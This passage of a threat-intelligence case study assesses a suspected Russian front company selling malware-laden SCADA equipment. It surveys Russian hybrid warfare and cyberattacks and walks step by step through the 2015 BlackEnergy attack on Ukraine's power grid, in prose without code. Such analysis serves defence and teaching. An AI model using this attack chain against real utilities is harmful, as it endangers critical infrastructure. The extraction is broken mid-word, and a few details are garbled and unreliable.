ge\nnuine production\n \nparts\n w\nit\nh \nmalware introduced\n \npost\n p\nroduction. \nVerification of \nOleg \nVladimirovich \nStrekozovs \nidentity \nis \nincomplete; \nthe name \nis \nlikely \nfictitious\n \nand\n p\nrobably\n \nstate\n-s\nponsored\n. \nEvidenc\ne \nthat\n s\nuggests\n t\nhis \no\nutcome: \nM\nalware Targets SCADA Devices\n \nTTPs are like Dragonfly or Energetic Bear (B2)\nTargeting SCADA devices is consistent with espionage practices (B2)\no\nProvides hackers a foothold into US critical infrastructure\nDelta Website\n \nin Taiwan\n \nA copycat website in Russia is suspicious and consistent with masquerade techniques (C3)\nA legitimate Russian business would not conduct themselves in such a way (C2)\nDelta Electronics, based out of Taiwan and has no records of any locations in \nSt. Petersburg (B2)\nMany Russian Domains with Delta Names\n \nA legitimate business would not want to have such a\ndisorganized web presence (C2)\no\n2\n0+ companies founded under this name cover various\nmarket sectors and verticals (B2)\nSome of the websites are know\nn to host a variety of malware\n(B2)\no\nMultiple IP\u2122s registered by Oleg and flagged as\nmalicious (B2)\nA registration certificate exists on delta\n-electronics.info \nsupporting possible state\n-\nsponsorship (C3)\nOther Information\n \nA bill of lading with the name \ufb01Oleg\n \nVladimirovich Strekozov\ufb02 (F3)\nStrekozov coincidentally translates \u201aDragonfly\u2122 as used by Symantec in early malware discoveries (B2)\nPhysical locations for DE appear to be vacant lots, apartment buildings, and non\n-\nSCADA businesses (C3)\nMatrix Group LLC (DE\n \nowner) physica\nl\nlo\ncation secured with gates, fences,\nkeypad access devices, and securit\ny\nc\nameras (C2)\nThe Matrix Group LLC lists over 260\n\ndomain names of varyin\ng\nle\ngitimacy (B2)\nThe location of NPO Stoik, a business\nnamed in document metadata found\non Del\nta Elektronics websites, is in\nMoscow, and, along with several other\n\nassociated addresses \nand likely \nnear\n\nbuildings used by Russian intelligenc\ne\na\ngencies \n(F3)\n Yuri\n Chekunov, Director at a government organization in Khanti\n-\nMansi district owns firms that buy\n \nand sell\nSCADA equipment (C3)\nYuri\u2122s firms have direct relationships with DE (B2)\nMr. Chekunov approves contracts for the government that his company\u2122s bid on (F3)\nIt is likely that Mr. Chekunov is part of the Russian oligarchy (F3)\nThe t\neam recommends placing a company service call to evaluate if anyone tampered with the suspected hardware.  Team \n1 recommends reducing production levels to minimize safety issues or equipment damage.  Manual inspection of \npurchased DE equipment required.\n \nWe recommend the \nfollowing: \nA complete scan, reverse engineering, and analysis of the software provided in a sandbox environment\nIdentification of other SCADA companies providing downloadable PLC software\no\nReview and analysis of this software\nEngagement with T\n-\nDE to determi\nne extent of the infections\no\nExamine web logs to determine downloads by clients\no\nIncident declaration and full examination of external hacking and insider threats\nEngagement with authorities to identify possible US infections and exploitation\nIntelligence g\naps include:\n \nWhether other malware campaigns intersect with this activity\nWhether any Chinese organization or agency stands \nto financially gain from this activity\nIf any data has been exfiltrated due to the malware\nThe scope of malware infections at other \nSCADA companies\nTangible evidence tying DE to the malware on T\n-\nDE websites\nAlt\nernative Analysis\n \nWe\n assess with low confidence that \nDelta Elektronics is a third\n-\nparty \norganization sponsored by the \n\nRussian government or is a false flag \n\noperations posing as a supplier to \n\nlegitimate electronic company \nhardware inserting malware into \nforeign industrial su\npply chains for \n\nespionage purposes. \nA\nn \nequally \nplausible\n \nassessment\n \n(low \nconfidence) \nis that D\nE \nis a front \ncompany used by criminals to either \n\nsell counterfeit equipment or to \n\nconduct a fraudulent \ufb01middle man\ufb02 \n\noperation to take a cut of the profit \n\nfrom the\n \nsale of legitimate \nequipment.\n \n Narrative Overview \u0152 \nSupporting Information\n \nThe behavior analysis topic will be used to discuss a \ncombined case studies\n \nrelated to SCADA systems and the sale of \nSCADA hardware and associated software that could be spiked (l\noaded with malware). The case study would focus on \npotential Russian activities in this area, their creation of fake companies, their duplication of websites and website conten\nt \nto make them look legitimate, and the tracking of the potential people behind \nthis to other malicious cyber activities.\n \n\ufb01A new type of war has emerged, in which armed warfare has given up its decisive place in the achievement of the \n\nmilitary and political objectives of war to another kind of warfare \n- \ninformation warfare.\ufb02\n \nInfiltrating systems in the deployment phase is attractive as this does not require the devices themselves to be vulnerable. \nAs SCADA systems generally are very poorly maintained, with patch penetrations bordering towards 0% when we have \nbeen able to obser\nve penetration on the market. The intentions apart from directly affecting those systems as means in a \nconflict, they are often deployed on networks from where they can reach other internal resources. Being able to infect \n\ndevices which are likely to spend 10 to 20 years on a network largely unmaintained is one of the most stable sources of \npersistence a threat actor can obtain. \nThis\n \nmeans the devices not only provide means of controlling critical infrastructure \nin other nations,\n \nbut\n \nit is also a means of ob\ntaining access to other internal resources for an extended period.\n \nTake for example the BlackE\nnergy attacks against Ukrainian SCADA assets. Assumed Russian cyber adversaries\n \ndisrupted \npower grid\n \noperations causing blackouts for over 225,000 customers in Uk\nraine\n.  The attack was highly complex using a \nmethodical approach to planning, direction, \nintelligence \ncollection, res\nource utilization, mission management, expert \nskills\n, highly malicious payloads, and combinations of manual, semi, continuous levels of au\ntomation.\n \nTargeted intellection collection started months \nbefore\n \nthe attack execution. Run like a well\n-\nmanaged special forces \noperation, the adversaries\n clandestinely created \npersistent access \nfootholds \nto multiple industrial networks, identified \nUkrainian\n energy-related \ntargets, \nbefore carrying out an integrated, complex, and process\n-\ndriven operation that \ndisrupted \nele\nctricity distribution and\n \ndestroyed \nvarious \nsystems, flooded call centers, distorted internal systems, and impeded \nincident response. \nBased \nupon\n \nsystem design and intelligence on the target, malware deployed by the adversaries \nexploited weaknesses in access protocols to gain administrative access to critical systems. Once inside, \nadversaries created \n\nvalid administrative accounts enabling later\nal movement across \ntrusted systems\n. The adversaries achieved\n \ntheir goals by \nshutting down power distribution to key functions of the grid.\n \nA\nnother possible aspect of exploiting SCADA systems starts at the physical level. Russian \ncorporations\n \nare\n \nmimicking global \norganizations that research and development, design, \nmanufacture\n, \nand sale \nof electronic control systems, industrial \nautomation products, digital display products, communication products, consumer electronics products, energy\n-\nsaving \nlighting applica\ntion, and energy technology\n (DLELY \nKey Statistics \n- \nDelta Electronics Inc., 2017)\n services\n. One such \norganization is Delta Electronics from Taiwan. \n \nThe accelerating trends of supply chain globalization and outsourced manufacturing and distribution have combined to \nincrease the pace of change, complexity, and risk for brand owners. These trends have created a fundamental shift in the \nway companies of a\nll sizes plan, source, make, and deliver their goods and services. The Russian focus to actively target \nvarious phases of the supply chain makes for malware installation to be viewed as normal network activity.\n A\nn a\nctivity\n \nthat is deemed normal upon installation of the hardware and software in question. \n \nSupply chains are difficult to \nsecure\n; \nthey\n \ncreate\n a \nrisk that is hard to identify, complicated to quantify and costly to \naddress. A compromise anywhere in the supply chain can have just as much impact on your organization, and its \n\nreputation, as one from within the organization. There is great necessity to track everything that is happening in the supply\n \nchain as even the smallest supplier\n, \nor the slightest hiccup can have\n a \ndangerous impact on your busines\ns. \n \nThe cyber security industry has already seen USB\n-\ndevices shipped with malware straight out of the factory, just as we have \nseen CD's from magazines with malware during the 90's. Affecting devices in the production line is of course equally \ntempting to \nactors from Russia as it is for the NSA. A state actor focusing on monitoring citizens has different requirements \n f\nrom a nation building its cyber arms arsenal. Where the NSA had a focus on networking equipment and traffic monitoring, \nthis makes the same degree of sense from a cyber arms perspective.\n \nRussian methods of information influence and information operations include network operations alongside disciplines \nsuch as psychological operations, strategic communications, Influence, along with \ufb01intelligen\nce, counterintelligence, \nmaskirovka, disinformation, electronic warfare, debilitation of communications, degradation of navigation support, \n\npsychological pressure, and destruction of enemy computer capabilities. Taken together, this forms a whole of system\ns, \nmethods, and tasks to influence the perception and behavior of the enemy, population, and international community on \nall levels.\n \nOne fundamental distinction between Russian and Western approaches to information activities is the categorization of \ncomput\ner network operations and other activities in cyberspace.\n \n\ufb01Cyber\ufb02 as a separate function or domain is not a Russian concept. The delineation of activities in the cyber domain from \n\nother activities processing, attacking, disrupting or stealing information is seen as artificial in Russian thinking. In this \ncontext, \ufb01Distributed denial of services attacks (DDoS), advanced [cyber] exploitation techniques and Russia Today \ntelevision are all related tools of information warfare.\n \nA key concept often lost on the We\nst is Russia\u2122s willingness to give primacy to non\n-\nkinetic operations, especially \ninformation warfare. The Western assumption has been that subversion, deception, and the like are all \u201aforce multipliers\u2122 \n\nto the combat arms, not forces in their own right. At\n \npresent, though, Russia is clearly seeing the kinetic and the non\n-\nkinetic as interchangeable and mutually supporting.\n \nRussia's use of the tools of information pressure \n- \na key theme of the latest statements by the representatives of the state \nadministrati\non sector in Ukraine. At the same \ntime\n, \nRussia denies any involvement in the facts of information aggression: \nhacking databases, network services and the use of information technology for propaganda purposes.\n \nTh\ne Russian targeting of various phases of the SCADA supply chain represents information\n-\ntechnology warfare (to affect \ntechnical systems which receive, collect, process and transmit information), which is conducted during wars and armed \nconflicts. The behaviors exhibited by the perpetrators is not usually targeted. Examining Russian activities within the \nSCADA supply chain requires analysis\n \nfocused on users, user accounts, user identities, and the sources of their activities. \n \nOpenly selling to various Western, Asian, and Middle Eastern energy organizat\nions who purchase from these known \ncompanies \nis \na method to infiltrate critical infrastructures in target organizations globally. The potential for use later is \npart of an overall sea, air, land, \ncyber\n \nintegrated strategy of hybrid warfare.\n  \nThis is but \none aspect of hybrid warfare attacks against the energy sector. The use of malicious code such as BlackEnergy \n\nserves as a reminder of the combined efforts by adversaries in using access to hardware in the supply chain and external \ninfiltration of this hard\nware without attribution.\n \nSince t\nhe\n \nDecember 2015\n \nattack against Ukraine\u2122s power grid\n, the \nUkraine \nhas experienced 6,500 cyber hacks to state institutions in November and December 2016 alone. Ukraine has accused \n\nRussia of these cyber\n-\nattacks, but Moscow ha\ns denied involvement\n. A standard behavior of non\n-\nattributable, hybrid \nwarfare\n. \n(Douris, 2017)\n \nChronology of Russian Attacks\n \n(Timeline: Ten Years of Russian Cyber Attacks on Other, n.d.)\nRussian cyber attacks normally \noccur in conjunction with geopolitical events. \nThey are part of his overall scheme of hybrid \nwarfare. \nAmid a show of hybrid tactics, Putin has awarded financial support to fringe political movements in Western \nEurope, launched cyberattacks and espionage in Europe, and ordered probing and actual attacks on U.S. and European \n\nenergy and communications infrastructure. He has continued to attempt to use control over energy \n\u0152 \npipelines, nuclear \nplants, natural gas supplies \n\u0152 \nto wield influence across Europe. Western intelligence reports say Russia has exacerbated \nthe Syrian migrant crisis. And, compounding the threat, Russia has formed a growing alliance with Iran and China, countries \n  \nthat possess their own hybrid toolboxes of proxy \nwarfare and cyber infiltration\n. \n(Mazarr, 2015)\n \nAnother standard behavior \nof hybrid warfare and one used against the energy sector.\n \nRussia\u2122s actions based upon \u201amaskirovka\u2122 deploys few military assets while coordinating multiple\n \nfunctions of \ndisinformation, psychological warfare, memetic enginerring, and deception to achieve goals.  Russia\u2122s actions are likened \nto placing a frog in a pot of cool water on a stove. While slowly heating up the water, the frog finds it difficult to n\notice \nthe increasing temperatures until it is too late. All the time not knowing who actually placed him (the frog) in the water \nand not knowing who continued to turn up the burner. Maskirovka translates to camoflage but is also defined as the \nelements of \nsurprise, diversion, and deception\n. Russia\u2122s\n \nasymmetrical activity \nprevales on the internet, in social media, \nand as \ntruth \nand \nis \ninclusive of all functions of warfare. The methods are relatively cheap and capitalize on the years of \nstudying Western behavi\nors. Russia is able to hack, infiltrate, \nmanipulate, and manage the perceptions of targets while \nensuring \nplausible deniability\n. They do so by using proxy groups,\n \nhackers for hire, and trained operatives all behind a \nmonitor and keyboard.\n \n \nApril \n-\n \nMay 2007:\n \nEstonia, a tiny Baltic nation that was occupied by the Soviet Union until 1991, angered \nMoscow by planning to move a Russian World War II memorial and Russian soldiers' graves. Russia\n \nretaliated\n \nby temporarily disabling Estonia's internet, an especially h\narsh blow \nto\n \nthe world's most \ninternet\n-\ndependent\n \neconomy. The distributed denial of service (DDoS) attack focused on government offices and financial \ninstitutions, disrupting communications.\n \n \nJune 2008: In a similar attack, Russia punished another former po\nssession in the Baltic. When the Lithuanian \ngovernment outlawed the display of Soviet symbols, Russian hackers defaced government web pages with \nhammer\n-\nand\n-\nsickles and five\n-\npointed stars.\n \n \nAugust 2008: After Georgia's pro\n-\nWestern government sent troops into\n \na breakaway republic backed by \nMoscow, Russian land, sea and air units invaded the country \n-\n \nand Russian hackers attacked Georgia's internet, \nthe\n \nfirst\n-\ntime\n \nRussia coordinated military\n,\n \nand cyber action. Georgia's internal communications were \neffectively \nshut down.\n \n \nJanuary 2009: As part of an effort to persuade the president of Kyrgyzstan to evict an American military base, \nRussian hackers shut down two of the country's four internet service providers with a DDOS attack. It worked. \nKyrgyzstan removed the m\nilitary base. Subsequently, Kyrgyzstan received $2 billion in aid and loans from the \nKremlin.\n \n \nApril 2009: After a media outlet in Kazakhstan published a statement by Kazakhstan's president that criticized \nRussia, a DDOS attack attributed to Russian element\ns shut down the outlet.\n \n \nAugust 2009: Russian hackers shut down Twitter and Facebook in Georgia to commemorate the first \n\nanniversary of the Russian invasion.\n \n \n2014 \n\u0152\n \nThe Pentagon blamed Russia for a sophisticated hack into the White House\u2122s unclassified emai\nl \ncorrespondence \nand\n \nthe State Department.\n \n \nMarch 2014: For the second time, the Russian government allegedly coordinated military and cyber action. A \n\nDDOS attack 32 times larger than the largest known attack used during Russia's invasion of Georgia disrupt\ned \nthe internet in Ukraine while Russian\n-\narmed pro\n-\nRussian rebels were seizing control of the Crimea.\n \n(JohnIB, \nn.d.)\n \n \nMay 2014: Three days before Ukraine's presidential election, a Russia\n-\nbased hacking group, took down the \ncountry's election commission in an overnight attack. Even a back\n-\nup system was taken down, but Ukrainian \ncomputer experts were able to restore the system before election day. Ukrainian police say they arrested \nhackers who were trying to rig the results. T\nhe attack was aimed at creating chaos and hurting the nationalist \ncandidate while helping the pro\n-\nRussian candidate. Russia's preferred candidate lost.\n \no\n \nBlackEnergy Chronology\n \n \n2007 \n-\n \nThe first version of BlackEnerg\ny appeared in 2007\n \nused to launch DDoS atta\ncks, create \nbotnets and steal banking credentials and so on.\n \n(Antiy, n.d.)\n \n  \n \n2008\n \n-\n \nDuring the Russian\n-\nGeorgian conflict, BlackEnergy \nused to \nconduct \ncyber\n-\nattacks\n \nagainst \nGeorgia.\n \n \n2009 \n-\n \nIn Citibank attack, the attacker had stolen\n \ntens of millions of dollars.\n \n \n2010 \n-\n \nBl\nackEnergy2 \nis released\n \nin 2010 supporting \nmore plug\n-\nin features.\n \n \n2014 \n-\n \nThe \nupdated version\n \nBlackEnergy defined Ukraine and Poland as its attack targets. \n \n \nOctober 2014 \n-\n \nBlackEnergy attacks HMI of several p\nroviders, t\nhe victims include GE, Advantech \nWebAccess, \nSiemensWinCC. \n \n \n14 October\n \n2014 \n-\n \niSIGHT discovered BlackEnergy sample which \nis delivered\n \nvia CVE\n-\n2014\n-\n4114.\n \n \nNovember 2014 \n-\n \nAttack the devices of Linux and Cisco.\n \n \nDecember 2014 \n-\n \nThe Information Security Report \npublished\n \nGerman Federal Office for \nInformation Security (BSI) in 2014 a cyber\n-\nattack against the infrastructure of one German mill\n. \nThe attack \ncau\nsed significant physical damage.\n \nReports indicated\n \nthat the incident \nwas related\n \nto \nBlackEnergy. \n \n \nNovember 20\n15 \n-\n \nDuring the presidential election in Ukraine, KillDisk infected several media \nagencies.\n \n \nDecember 2015 \n-\n \nUkraine government asserted that BlackEnergy \nshould\n \nresponsible for the \nblackout incidents in the region of \nLavno\n-\nFranklvst\n \nof Ukraine.\n \n \nMay 2015: \nGerman investigators discovered hackers had penetrated the computer network of the German \nBundestag, the most significant hack in German history. The\n \nBundesamt f\u00fcr Verfassungsschutz\n \n(\nBfV\n)\n, \nGerman's domestic intelligence service, later said Russia was behin\nd the attack and that they were seeking \n\ninformation not just on the workings of the Bundestag, but German leaders and NATO, among others. Security \nexperts said hackers were trying to penetrate the computers of Chancellor Angela Merkel's Christian \nDemocrati\nc party.\n \n \n2015 \n\u0152\n \nFrance Russia sought to destroy France\u2122s TV5Monde channel via an April 2015 cyberattack.  The attack \ntook the channel off\n \nair\n \nfor several hours.  \n \n \nOctober 2015 \n-\n \nAt the November NATO meeting in Bulgaria, its prime minister explained that St\narting on 25 \nOctober, websites of the council of ministers of \nP\narliament and\n \nthe central election committee \nwere \nattacked\n \nthrough cyber capabilities in an unprecedented way. The Prime Minister blamed the Russians for the attacks, \n\nas it also coincided with \nincreased incursions into their airspace by Russian planes.\n \n \n2015: Turkey blamed Russia for a massive \ncyber\n-\nattack\n \nthat forced it to close external traffic to NIC.tr, making \nit impossible to access or send email from .tr addresses.  Turkey had been at odds \nwith Russia after shooting \ndown a Russian plane in its \nairspace\n.\n \n \n2016: US Democratic National Committee. Starting with the Democratic National Convention and continuing \ninto the fall campaign, Julian Assange\u2122s WikiLeaks has released emails purportedly comi\nng from the \nDemocratic National Committee and the Clinton campaign.\n \nA\n \nJoint Statement from the Department of \nHomeland Security and Office of the Director of National Intelligence \nput the blame\n \nsquarely on the Russians.\n \nBlackEnergy\n \n \nExecution and Behavior\n \nS\ntep  1:  Reconnaissance and Intelligence Gathering\n. \nBefore\n \nthe attack, adversaries \nlikely begin open\n-\nsource \nintelligence gathering and reconnaissance on potential targets.\n \n(WHEN THE LIGHTS WENT OUT, n.d.)\n \nLocation: External \ninfrastructure Action: Active threat actor activity Timeline: May 2014 or earlier\n \nDevice/application:  Activity conducted external to network\n \nRole in infrastructure: Activity conducted external to network\n \n  \nExploitation method:\n \nAdversaries \nlikely gather publ\nicly available information on deployed systems and network \narchitecture, and may also use active discovery methods such as scanning of perimeter devices,\n \nenumeration of \ndevices, social media data collection and analysis for future targeting\n \nStep 2:  Malwar\ne Development and Weaponization\n. Adversaries acquire or independently develop the malware \nto \nbe used\n \nin the attack, as well as the weaponized documents to deliver malware.\n \nLocation: External infrastructure Action: Active threat actor activity Timeline: May\n \n2014 or earlier\n \nDevice/application:  Activity conducted external to network\n \nRole in infrastructure: Activity conducted external to network\n \nExploitation method:\n \nAdversaries \nacquire BlackEnergy remote access \nT\nrojan (RAT) and weaponize Microsoft \n(MS) Word an\nd Excel files with VBA scripts to drop the BlackEnergy RAT.\n \nImpact: Combined with targeting data gathered during the reconnaissance phase,\n \nadversaries can develop \ntailored attack packages. At the completion of this step, adversaries have the necessary tools to begin their \nattack.\n \nStep 3:  Del\niver Remote Access Trojan (RAT)\n \nAdversaries initiate phishing campaign against electricity \ndistributo\nrs. Step 4: Install RAT. Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors \nafter employees open the weaponized MS Office email attachments and enable macros.\n \nLocation: Corporate \nnetwork\n \nAction: Active threat actor act\nivity Timeline: May 2014\n\u0152\nJune 2015e\n \nDevice/\napplication\n: Employee workstations, likely using MS Windows OS and provisioned with MS Internet \nExplorer web browser\n \nRole in \ninfrastructure\n: Support email communications and other IT services used in business oper\nations.\n \nExploitation method: Adversaries send targeted emails containing the modified MS Office files as attachments to \nusers on targeted networks. \n \nImpact: RAT is delivered to targeted network, but not installed. Installation requires employees \nto activel\ny grant \npermission to the embedded VBA scripts to execute\n.\n \nStep 4: Adversaries install BlackEnergy 3\n \non each of the three targeted electricity distributors after employees \nopen the weaponized MS Office email attachments and enable macros.\n \nLocation: Corpora\nte network\n \nAction: Employee\n-\nenabled malware execution\n \nTimeline: May 2014\n\u0152\nJune 2015\n \nDevice/\napplication\n: Employee workstations, likely using MS Windows OS and provisioned with MS Internet \nExplorer web browser\n \nRole in \ninfrastructure\n: Support email communicati\nons and other services used in business operations.\n \nExploitation method: In a social engineering attack, employees are prompted to enable macros when opening \nthe file attached to \nphishing\n \nemail. Once macros are enabled, the VBA script places multiple malic\nious files on \nthe workstation, unbeknown to the employee.\n \nImpact: Files placed on workstations within the corporate network can begin the communication process with \nexternal Command and Control (CC) servers.\n \n  \nStep 5:  Establish CC Connection\n. Malware establ\nishes \nconnection\n \nfrom\n \nthe\n \nmalicious\n \nimplant on\n \nthe\n \ntargeted\n \nnetwork to attacker\n-\ncontrolled CC server.\n \nLocation: Corporate \nnetwork\n \nAction: Malware \nexecution\n \nTimeline: May 2014\n\u0152\nJune 2015\n \nDevice/\napplication\n: Employee workstations, likely using MS Windows OS \nand provisioned with MS Internet \nExplorer web browser\n \nRole in \ninfrastructure\n: Support email communications and other services used in business operations.\n \nExploitation method: The external connection \nis established\n \nas part of the execution routine followin\ng \ninstallation of the malicious files. Once permissions to execute macros are granted by employees, the malicious \nVBA script installs the malware implant, and the implant attempts to communicate with an external server via \nHTTP requests.\n \nImpact: Adversarie\ns gain unauthorized access to targeted networks, including the ability to deliver additional \nBlackEnergy plugins to enable internal network reconnaissance and credential harvesting.\n \nStep 6:  Deliver Malware Plugins\n \nFollowing installation of BlackEnergy 3 i\nmplant, adversaries likely import plugins to \nenable credential harvesting and internal network reconnaissance.\n \nLocation: Corporate network\n \nAction: Active threat actor activity Timeline: June 2015\n\u0152\nDecember 2015 Device/\napplication\n: Employee \nworkstations,\n \nlik\nely using MS Windows OS and provisioned with MS Internet Explorer web browser\n \nRole in \ninfrastructure\n: Support email communications and other services used in business operations\n \nExploitation method: The BlackEnergy 3 implant delivered in the initial attack\n \nfunctions as a receiver for \nadditional malware plugins. After establishing a remote connection with delivered files via HTTPS, the threat \nlikely delivers the additional malware components.\n \nImpact: The delivered plugins enable additional BlackEnergy functi\nonality, including harvesting user credentials, \nkeylogging, and network reconnaissance.\n \nStep 7: Harvest Credentials\n. Delivered BE3 malware plugins conduct credential harvesting and network discovery \nfunctions. \n \nDelivered BlackEnergy 3 malware plugins \nconduct credential harvesting and network discovery functions.\n \nLocation: Corporate network\n \nAction: Active threat actor activity, malware execution\n \nTimeline: June 2015\n\u0152\nDecember 2015\n \nDevice/\napplication\n: Windows OS workstations, Windows domain controllers, vi\nrtual private network (VPN) \nservice deployed in control  environment\n \nRole in infrastructure: These systems support business operations, manage permissions and domain access, and \nprovide remote network access respectively.\n \nExploitation method: Adversaries u\nse delivered BlackEnergy 3 plugins to gather stored credentials or log \nkeystrokes. After gathering valid credentials for \nuser\n \nwith administrator privileges, adversaries use the stolen \n  \nadministrator credentials to access the domain controller, recover addit\nional credentials, and create new \nprivileged accounts.\n \nImpact: Adversaries obtain valid credentials enabling them to expand access \nacross\n \nthe corporate network and \ninto the control environment, ensure persistent access, and blend into regular network traff\nic.\n \nStep 8: Lateral Movement and Target Identification on Corporate Network\n \nAdversaries conduct internal reconnaissance on \ncorporate\n \nnetwork to discover potential targets and expand \naccessed.\n \nLocation: Corporate network\n \nAction: Active threat actor activity\n, malware execution Timeline: June 2015\n\u0152\nDecember 2015\n \nDevice/\napplication\n:  Discovered systems, including networked \nuninterruptable\n \npower supply (UPS) devices, data \ncenter servers, a telephone communications server, and employee workstations\n \nRole in infrast\nructure: Internal reconnaissance efforts could potentially include all deployed devices on the \ncorporate network.\n \nExploitation method: Adversaries likely use a combination of valid user credentials and BlackEnergy 3 plugins \ndeveloped to conduct network dis\ncovery. VS.dll plugin is likely used to leverage MS Sysinternals PsExec to \nestablish remote connections to workstations and servers.\n \nImpact: Adversaries can enumerate the systems deployed across the network, identify targets, and begin \n\npreparations for fin\nal attack.\n \nStep 9: Lateral Movement and Target\n \nIdentification on ICS network\n \nAdversaries use stolen credentials to access the control environment and conduct reconnaissance on deployed \nsystems.\n \nLocation: ICS network\n \nAction: Active threat actor activity\n \nTim\neline: June 2015\n\u0152\nDecember 2015\n \nDevice/\napplication\n:  Discovered systems, including human machine interface (HMI) workstations, distributed \nmanagement system (DMS) servers, UPS devices, 52 serial\n-\nto\n-\nEthernet converters (Moxa UC 7408\n-\nLX\n-\nPlus, 53 \nIRZRUH2 3G54)\n, remote\n \nterminal unit (RTU) devices (ABB RTU560 CMU\n-\n02), and the substation breakers\n \nRole in infrastructure: HMI workstations provide a graphical user interface for operators \nto remotely monitor \n\nand control devices within the control environment\n.\n \nDMS appl\nications enable centralized monitoring and issuing of commands within a \ncontrol\n \nenvironment. UPS \ndevices condition incoming power to downstream devices and provide temporary battery backup power. Serial\n-\nto\n-\nEthernet converters convert serial data from field\n \ndevices to digital packets, enabling communications with \nthe control center. RTU devices function as a communication processor or a data concentrator in a substation, \nenabling communications and data transfer between field devices in the substations and t\nhe control center. \nSubstation breakers are devices designed \nto physically interrupt current flows through an electrical circuit\n.\n \nExploitation method: Adversaries use valid credentials to interact directly with the client application for the DMS \nserver via \na VPN, and native remote access services to access employee workstations hosting HMI applications. \nThis access likely enables adversaries to enumerate all networked devices within the control environment.\n \n  \nImpact: Adversaries gain access to critical \nsystems, enabling them to begin target selection and preparations for \nfinal attack.\n \nStep 10: Develop Malicious Computer \nC\node\n. Adversaries develop malicious computer code update for identified \nserial\n-\nto\n-\nEthernet converters.\n \nLocation: External infrastructure\n \nAction: Active threat actor activity Timeline:  June 2015\n\u0152\nDecember 2015\n \nDevice/application: Activity conducted external to network\n \nRole in infrastructure: Activity conducted external to network\n \nExploitation method: After identifying deployed converts, adv\nersaries begin a malware development and testing \neffort on infrastructure outside of the targeted network.\n \nImpact: Upon completion of this step, adversaries would have target\n-\nspecific malware designed to disrupt \ncommunications with field devices by disabli\nng deployed converters.\n \nStep 11:  Deliver Data Destruction Malware\n. Adversaries likely deliver KillDisk malware to\n \na\n \nnetwork\n \nshare and set \npolicy on\n \nthe\n \ndomain\n \ncontroller to retrieve malware and execute upon system reboot.\n \nLocation: Corporate and ICS netwo\nrk\n \nAction: Active threat actor activity\n \nTimeline: December 2015, directly preceding attack\n \nDevice/\napplication\n: Network share and Windows domain controller server\n \nRole in \ninfrastructure\n: The network share provides access to shared digital resources, and the\n \nWindows domain \ncontroller manages access control throughout the network.\n \nExploitation method: Adversaries likely use stolen credentials to place KillDisk malware on a network share, then \nset the retrieval and execution of the malicious files by implementi\nng a policy on the compromised domain \ncontroller server.\n \nImpact: Prescheduling execution of malware enables coordination of multiple attack components, such that \ndata destruction coincides with or shortly follows attacks against breakers.\n \n \nStep 12:  Schedu\nle Uninterruptable Power Supply (UPS) Disruption\n. Adversaries schedule unauthorized \noutage of UPS for telephone communication server and data center servers.\n \nLocation: Corporate and ICS network\n \nAction: Active threat actor activity\n \nTimeline: Directly preced\ning December 2015 attack\n \nDevice/\napplication\n: Networked UPS devices with remote management interface\n \nRole in infrastructure: Prevent power outages from disrupting \ncontinuous\n \noperation of critical systems.\n \nExploitation method: Adversaries likely use valid cr\nedentials to access privileged employee accounts, then use \nthis access \nto remotely schedule unauthorized power outages\n.\n \n  \nImpact: Prescheduling outages enables coordination of multiple attack components, such that critical systems \nalso go down because of the\n \npower outages, stifling potential restoration efforts.\n \nStep 13: Trip Breakers\n. Adversaries use native remote access services and valid credentials to open breakers and \ndisrupt power distribution to over 225,000 customers within three distribution areas.\n \nL\nocation: ICS network\n \nAction: Active threat actor activity\n \nTimeline: December 23, 2015, during\n \nDevice/\napplication\n: HMI workstations, DMS servers, RTU, and the substation breakers\n \nRole in infrastructure: HMI workstations provide a graphical user interface for operators \nto remotely monitor \nand control devices within the control environment\n.\n \nDMS applications enable centralized monitoring and issuing of commands within a \ncontrol\n \nenviro\nnment. \nSubstation breakers are devices designed \nto physically interrupt current flows through an electrical circuit\n.\n \nExploitation method: Adversaries use valid credentials to seize control of operator workstations, access DMS \n\nclient application via VPN, an\nd issue unauthorized commands to breakers at substations.\n \nImpact: Opening of breakers results in disruption of electricity service to customers.\n \n \nStep 14:  Sever Connection to Field Devices\n. After opening the breakers, adversaries deliver malicious compute\nr \ncode update to serial\n-\nto\n-\nEthernet communications devices. The malicious updates render the converters \ninoperable,\n \nand sever connections between the control center and the substations.\n \nLocation: ICS network\n \nAction: Active threat actor activity\n \nTimeline: D\necember 23, 2015, during attack\n \nDevice/application: Serial\n-\nto\n-\nEthernet converters (Moxa UC 7408\n-\nLX\n-\nPlus,55 IRZRUH2 3G56)\n \nRole in infrastructure: Convert serial data from field devices to digital packets to be transmitted to remote \n\nmonitoring and administra\ntion systems within the control network.\n \nExploitation method: Adversaries use network access to push the malicious update over the network to targeted \ndevices.\n \nImpact: Operators are unable to remotely close the breakers, requiring workers \nto manually close\n \nbreakers at \neach substation\n. Forcing this manual response draws out recovery time\n \nStep 15:  Telephony Denial\n-\nof\n-\nService Attack\n. Adversaries initiate DoS attack on telephone call center at one of \nthe targeted distributors.\n \nLocation: Corporate network\n \nAction: Likely automated process\n \nTimeline: Dec 23, 2015, during attack\n \nDevice/\napplication\n: Operator telephone call center \n \n  \nRole in infrastructure: Receive external telephone communications from customers.\n \nExploitation method: Adversaries likely use automat\ned IP\n-\nbased call generators to flood the targeted call center.\n \nImpact: Automated calls overwhelm resources at \ncall\n \ncenter, blocking legitimate communications from \ncustomers.\n \nStep 16:  Disable Critical Systems via UPS Outage\n. Previously scheduled UPS outage\n \ncuts power to targeted \ntelephone communications server and data center servers.\n \nLocation: Corporate and ICS network Action: Execution of prescheduled process Timeline: December 23, 2015, \nduring attack\n \nDevice/\napplication\n: Networked UPS devices with remote \nmanagement interface, telephone communications \nserver, and data center servers\n \nRole in infrastructure: Prevent power outages from disrupting \ncontinuous\n \noperation of critical systems.\n \nExploitation method: Adversaries use network access to schedule the tempo\nrary backup power to be offline at \nthe time of the power outages.\n \nImpact: Power loss to telephone server disrupts communications across remote sites, and disruptions at control \ncenters inhibit \nability\n \nto monitor and respond to attack against breakers. The \ndisruption at the data center and \nassociated system reboot trigger execution of KillDisk malware.\n \nStep 17:  Destroy Critical System Data\n. \nScheduled\n \nexecution of KillDisk malware erases the master boot records \nand deletes system log data on targeted machines across the victims\u2122 corporate and ICS network.\n \nLocation: Corporate network and ICS network\n \nAction: Malware execution\n \nTimeline: December 23, 2015,\n \nduring attack\n \nDevice/\napplication\n: RTU device (ABB RTU560 CMU\n-\n02),57 servers and workstations used by management, \nhuman resources (HR), and finance staff\n \nRole in \ninfrastructure\n: The RTU functions as a communication processor or data concentrator in a subst\nation, \nenabling communications and data transfer 